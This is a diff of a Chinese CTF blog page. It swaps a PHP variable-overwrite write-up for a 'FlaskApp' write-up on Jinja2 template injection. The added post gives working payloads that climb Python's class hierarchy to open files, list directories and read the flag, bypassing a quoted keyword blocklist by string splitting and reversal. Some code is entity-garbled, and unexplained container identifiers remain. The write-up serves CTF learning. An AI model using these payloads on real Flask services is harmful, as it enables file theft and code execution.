@@ -16,27 +16,24 @@
   <meta name="author" content="伤心猪大肠">
   <meta name="keywords" content="">
   
-    <meta name="description" content="解题思路   dirsearch扫描目录，发现git文件，说明存在git泄露。   GitHack下载源码    ​	发现存在flig.php和index.php，查看源代码   代码审计 12&lt;?php$flag &#x3D; file_get_contents(&amp;#x27;&#x2F;flag&amp;#x27;); 1234567891011121314151617181920212223242526272829">
+    <meta name="description" content="预备知识   jinja2中 控制结构 &#96;&amp;#123;% %&amp;#125;&#96; 变量取值 &amp;#123;&amp;#123; &amp;#125;&amp;#125; 123456789101112   2. 函数和属性   &#96;&#96;&#96;python   __class__         返回调用的参数类型   __bases__         返回基类列表    __mro__           此属性是在方法解析期间寻找基">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Mark loves cat">
-<meta property="og:url" content="http://example.com/2023/03/01/Mark-loves-cat/index.html">
+<meta property="og:title" content="FlaskApp">
+<meta property="og:url" content="http://example.com/2023/03/01/FlaskApp/index.html">
 <meta property="og:site_name" content="嗨嘿害">
-<meta property="og:description" content="解题思路   dirsearch扫描目录，发现git文件，说明存在git泄露。   GitHack下载源码    ​	发现存在flig.php和index.php，查看源代码   代码审计 12&lt;?php$flag &#x3D; file_get_contents(&amp;#x27;&#x2F;flag&amp;#x27;); 1234567891011121314151617181920212223242526272829">
+<meta property="og:description" content="预备知识   jinja2中 控制结构 &#96;&amp;#123;% %&amp;#125;&#96; 变量取值 &amp;#123;&amp;#123; &amp;#125;&amp;#125; 123456789101112   2. 函数和属性   &#96;&#96;&#96;python   __class__         返回调用的参数类型   __bases__         返回基类列表    __mro__           此属性是在方法解析期间寻找基">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/2023/03/01/Mark-loves-cat/1.png">
-<meta property="og:image" content="http://example.com/2023/03/01/Mark-loves-cat/2.png">
-<meta property="article:published_time" content="2023-03-01T08:03:23.000Z">
-<meta property="article:modified_time" content="2023-03-01T08:07:26.993Z">
+<meta property="article:published_time" content="2023-03-01T08:52:02.000Z">
+<meta property="article:modified_time" content="2023-03-01T08:58:32.091Z">
 <meta property="article:author" content="伤心猪大肠">
 <meta property="article:tag" content="BUUCTF">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://example.com/2023/03/01/Mark-loves-cat/1.png">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>Mark loves cat - 嗨嘿害</title>
+  <title>FlaskApp - 嗨嘿害</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -202,7 +199,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="Mark loves cat"></span>
+            <span id="subtitle" data-typed-text="FlaskApp"></span>
           
         </div>
 
@@ -218,7 +215,7 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-03-01 16:03" pubdate>
+        <time datetime="2023-03-01 16:52" pubdate>
           2023年3月1日 下午
         </time>
       </span>
@@ -230,7 +227,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.4k 字
+          2.4k 字
         
       </span>
     
@@ -241,7 +238,7 @@
         
         
         
-          12 分钟
+          21 分钟
         
       </span>
     
@@ -300,12 +297,12 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">Mark loves cat</h1>
+            <h1 style="display: none">FlaskApp</h1>
             
               <p class="note note-info">
                 
                   
-                    本文最后更新于：1 小时前
+                    本文最后更新于：几秒前
                   
                 
               </p>
@@ -313,47 +310,50 @@
             
               <div class="markdown-body">
                 
-                <h3 id="解题思路">解题思路</h3>
+                <h3 id="预备知识">预备知识</h3>
 <ol>
 <li>
-<p>dirsearch扫描目录，发现git文件，说明存在git泄露。</p>
-</li>
-<li>
-<p>GitHack下载源码</p>
-<p><img src="1.png" srcset="/img/loading.gif" lazyload alt="image-20221111153901725"></p>
-</li>
-<li>
-<p>​	发现存在flig.php和index.php，查看源代码</p>
+<pre><code class="hljs">jinja2中 控制结构 `&#123;% %&#125;` 变量取值 &#123;&#123; &#125;&#125;
+<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><br>   <br><br><span class="hljs-number">2</span>. 函数和属性<br><br>   ```python<br>   <span class="hljs-variable">__class__</span>         返回调用的参数类型<br>   <span class="hljs-variable">__bases__</span>         返回基类列表 <br>   <span class="hljs-variable">__mro__</span>           此属性是在方法解析期间寻找基类时的参考类元组 <br>   <span class="hljs-variable">__subclasses__</span>()  返回子类的列表 <br>   <span class="hljs-variable">__globals__</span>       以字典的形式返回函数所在的全局命名空间所定义的全局变量，与 func_globals 等价 <br>   <span class="hljs-variable">__builtins__</span>      内建模块的引用，在任何地方都是可见的(包括全局)，每个 Python 脚本都会自动加载，这个模块包括了很多强大的 built-<span class="hljs-built_in">in</span> 函数，例如eval, <span class="hljs-built_in">exec</span>, open等等<br></code></pre></td></tr></table></figure>
+
+</code></pre>
 </li>
 </ol>
-<h3 id="代码审计">代码审计</h3>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$flag</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>);<br></code></pre></td></tr></table></figure>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><br><span class="hljs-variable">$yds</span> = <span class="hljs-string">&quot;dog&quot;</span>;<br><span class="hljs-variable">$is</span> = <span class="hljs-string">&quot;cat&quot;</span>;<br><span class="hljs-variable">$handsome</span> = <span class="hljs-string">&#x27;yds&#x27;</span>;<br><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_POST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;<br>    <span class="hljs-variable">$$x</span> = <span class="hljs-variable">$y</span>; <br>&#125;<br><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;<br>    <span class="hljs-variable">$$x</span> = <span class="hljs-variable">$$y</span>; <br>&#125;<br><span class="hljs-comment">//如果 get型flag参数绝对等于变量名并且变量名等不等于flag则执行 exit($handsome)，这里可以用?flag=aaa&amp;aaa=123输出$handsome，但是这个写法会在前面进行变量覆盖的时候让$flag = $aaa进而报错（因为$aaa不存在），因此这里行不通。</span><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-variable">$x</span> &amp;&amp; <span class="hljs-variable">$x</span> !== <span class="hljs-string">&#x27;flag&#x27;</span>)&#123;  <span class="hljs-comment">//</span><br>        <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$handsome</span>);<br>    &#125;<br>&#125;<br><span class="hljs-comment">//如果GET和POST都没有传flag参数，则执行exit($yds)这里可以传?yds=flag，经过变量覆盖之后就$yds = $flag，从而输出$flag的值。</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$yds</span>);<br>&#125;<br><br><span class="hljs-comment">//如果GET或POST有一个或都传了flag参数而且参数值为flag，则执行exit($is)这里我们可以让GET传$_GET[flag]=flag，则进入了条件语句里面，再传?is=flag，进行变量覆盖使$is = $flag，即可。</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span>  || <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span>)&#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$is</span>);<br>&#125;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;the flag is: &quot;</span>.<span class="hljs-variable">$flag</span>;<br></code></pre></td></tr></table></figure>
+<h3 id="解题过程">解题过程</h3>
 <ol>
 <li>
-<p>php中有两个美元符号$$的变量——可变变量</p>
-<ol>
-<li>
-<p>可变变量：如果一个变量保存的值刚好是另外一个变量的名字，那么可以直接通过访问一个变量得到另外一个变量的值：在变量之前再多加一个 $ 符号</p>
+<p><a target="_blank" rel="noopener" href="http://xn--app-gx3eo66a02ost7d.py">读取完整app.py</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;% <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;<br>&#123;% <span class="hljs-keyword">if</span> c.__name__==<span class="hljs-string">&#x27;catch_warnings&#x27;</span> %&#125;<br>&#123;&#123; c.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;app.py&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>).read() &#125;&#125;<br>&#123;% endif %&#125;&#123;% endfor %&#125;<br></code></pre></td></tr></table></figure>
 </li>
 <li>
-<p>eg：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;b&#x27;</span>;<br><span class="hljs-variable">$b</span> = <span class="hljs-string">&#x27;bb&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$$a</span>; <br><span class="hljs-comment">// 输出 bb   1.找到 $a,解析结果：b    2.找到$b,解析结果 bb</span><br></code></pre></td></tr></table></figure>
+<p>发现waf，过滤了部分关键字，并且会将字符转小写。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>): <br>  black_list = [ &amp;<br>    <span class="hljs-comment">#34;flag&amp;# 34;, &amp; #34;os&amp;# 34;, &amp; #34;system&amp;# 34;, &amp;</span><br>    <span class="hljs-comment">#34;popen&amp;# 34;, &amp; #34;import&amp;# 34;, &amp; #34;eval&amp;# 34;, &amp;</span><br>    <span class="hljs-comment">#34;chr&amp;# 34;, &amp; #34;request&amp;# 34;, &amp; #34;subprocess&amp;# 34;, &amp;</span><br>    <span class="hljs-comment">#34;commands&amp;# 34;, &amp; #34;socket&amp;# 34;, &amp; #34;hex&amp;# 34;, &amp;</span><br>    <span class="hljs-comment">#34;base64&amp;# 34;, &amp; #34;*&amp;# 34;, &amp; #34;?&amp;# 34;</span><br>]<br>  <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> black_list: <br>    <span class="hljs-keyword">if</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>.lower(): <br>      <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>@ app.route( &amp;<span class="hljs-comment">#39;/hint&amp;# 39;, methods = [ &amp; #39;GET&amp;# 39;])</span><br><br></code></pre></td></tr></table></figure>
+</li>
+<li>
+<p>使用listdir方法看看当前目录文件</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;% <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;<br>&#123;% <span class="hljs-keyword">if</span> c.__name__==<span class="hljs-string">&#x27;catch_warnings&#x27;</span> %&#125;<br>&#123;&#123; c.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;__imp&#x27;</span>+<span class="hljs-string">&#x27;ort__&#x27;</span>](<span class="hljs-string">&#x27;o&#x27;</span>+<span class="hljs-string">&#x27;s&#x27;</span>).listdir(<span class="hljs-string">&#x27;/&#x27;</span>)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;<br><br></code></pre></td></tr></table></figure>
+</li>
+<li>
+<p>发现this_is_the_flag.txt，使用字符串拼接绕过waf读取。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;% <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;<br>&#123;% <span class="hljs-keyword">if</span> c.__name__==<span class="hljs-string">&#x27;catch_warnings&#x27;</span> %&#125;<br>&#123;&#123;c.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/this_is_the_fl&#x27;</span>+<span class="hljs-string">&#x27;ag.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>).read()&#125;&#125;<br>&#123;% endif %&#125;&#123;% endfor %&#125;<br><br></code></pre></td></tr></table></figure>
 </li>
 </ol>
+<h3 id="其他绕过方法">其他绕过方法</h3>
+<ol>
+<li>
+<p>倒序输出绕过：txt.galf_eht_si_siht/’[::-1]</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;% <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;<br>&#123;% <span class="hljs-keyword">if</span> c.__name__==<span class="hljs-string">&#x27;catch_warnings&#x27;</span> %&#125;<br>&#123;&#123;c.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;txt.galf_eht_si_siht/&#x27;</span>[::-<span class="hljs-number">1</span>],<span class="hljs-string">&#x27;r&#x27;</span>).read()&#125;&#125;<br>&#123;% endif %&#125;&#123;% endfor %&#125;<br><br></code></pre></td></tr></table></figure>
 </li>
 <li>
-<p>exit — 输出一个消息并且退出当前脚本</p>
+<p>e6:60:b2:ed:86:db</p>
 </li>
-</ol>
-<h3 id="实现">实现</h3>
-<ol>
-<li><img src="2.png" srcset="/img/loading.gif" lazyload alt="image-20221111162643054"></li>
-</ol>
-<h3 id="参考连接">参考连接</h3>
-<ol>
-<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/linkzoom/articles/15147013.html">https://www.cnblogs.com/linkzoom/articles/15147013.html</a></li>
-<li><a target="_blank" rel="noopener" href="https://johnfrod.top/ctf/bjdctf-2020mark-loves-cat/">https://johnfrod.top/ctf/bjdctf-2020mark-loves-cat/</a></li>
+<li>
+<p>1:name=systemd:/kubepods.slice/kubepods-burstable.slice/kubepods-burstable-podd88952f2_0f6f_4832_a6c2_678785e3de19.slice/docker-</p>
+</li>
+<li>
+<p>c9de5b97b0ef331f6daa298c2ed5a1e46d7e3eb19003b74cfd71b2c11e9cb303.scope</p>
+<p>4bac89c2faec2a0a2ca846544549977cbae8dde2196eb964942a7d4e383fc7a4</p>
+</li>
 </ol>
 
                 
@@ -402,9 +402,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2023/03/01/%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/" title="禁止套娃">
+                      <a href="/2023/03/01/Fake-XML-cookbook/" title="Fake XML cookbook">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">禁止套娃</span>
+                        <span class="hidden-mobile">Fake XML cookbook</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -412,8 +412,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2021/06/10/Test/" title="Test">
-                        <span class="hidden-mobile">Test</span>
+                      <a href="/2023/03/01/%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/" title="禁止套娃">
+                        <span class="hidden-mobile">禁止套娃</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
